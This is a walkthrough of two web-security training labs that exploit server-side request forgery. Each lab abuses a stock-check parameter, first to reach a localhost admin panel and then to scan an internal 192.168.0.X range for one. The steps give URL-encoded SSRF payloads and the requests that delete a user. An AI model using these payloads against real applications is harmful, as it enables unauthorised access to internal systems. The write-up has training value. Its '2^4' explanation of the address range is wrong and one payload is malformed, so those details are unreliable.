## Lab: Basic SSRF against the local server
This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`

### Solve:
1. visit one of any product, click check stock, capture on burp
2. notice the api call `stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1`
3. change to `stockApi=http%3a%2f%2flocalhost%2fadmin`
4. forward the request, look into the bottom, the admin panel pops
5. delete user `carlos`
6. error will show `Admin interface only available if logged in as an administrator, or if requested from loopback` with the slug `/admin/delete?username=carlos`
7. go back and change the api call to `stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete%3fusername%3dcarlos`
8. forward the request
9.  the lab will be solved

## Lab: Basic SSRF against another back-end system
This lab has a stock check feature which fetches data from an internal system. To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`

### Solve:
1. visit one of any product, click check stock, capture on burp
2. notice the api call `stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1` send to intruder and change to `stockApihttp%3a%2f%2f192.168.0.ยง1ยง%3a8080%2fadmin`
3. set the payload to number from 0 to 255 (should i explain this? its because an ip block range are 2^4 which is 256, 0 to 255)
4. start attack, look for 200 status.. in my case its `192.168.0.78:8080/admin`
5. send a request to that address (change the api call), it return not found, but the slug are acquired `/admin/delete?username=carlos`
6. re make the request with this api call `http://192.168.0.78:8080/admin/delete?username=carlos`
7. lab is solved
